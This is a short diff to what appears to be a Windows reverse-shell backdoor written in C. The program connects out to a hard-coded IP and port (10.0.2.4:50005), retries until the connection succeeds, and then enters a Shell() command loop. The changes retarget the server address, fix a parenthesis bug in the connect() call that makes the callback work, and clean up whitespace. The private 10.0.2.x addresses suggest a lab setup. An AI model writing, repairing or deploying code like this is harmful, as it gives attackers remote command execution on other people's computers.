@@ -18,7 +18,7 @@ void Shell() {
 	char buffer[1024];
 	char container[1024];
 	char total_response[18384];
-	
+
 	while (1) {
 		jump:
 		bzero(buffer, sizeof(buffer));
@@ -54,11 +54,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	char *ServIP;
 	WSADATA wsaData;
 
-	ServIP = "10.0.2.15";
+	ServIP = "10.0.2.4";
 	ServPort = 50005;
 
 	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
-		exit(1);		
+		exit(1);
 	}
 
 	sock =  socket(AF_INET, SOCK_STREAM, 0);
@@ -69,12 +69,12 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	ServAddr.sin_port = htons(ServPort);
 
 	start:
-	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr) != 0)) {
+	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
 		Sleep(10);
-		goto start;		
+		goto start;
 	}
 
-	Shell();	
-} 
+	Shell();
+}
 
 
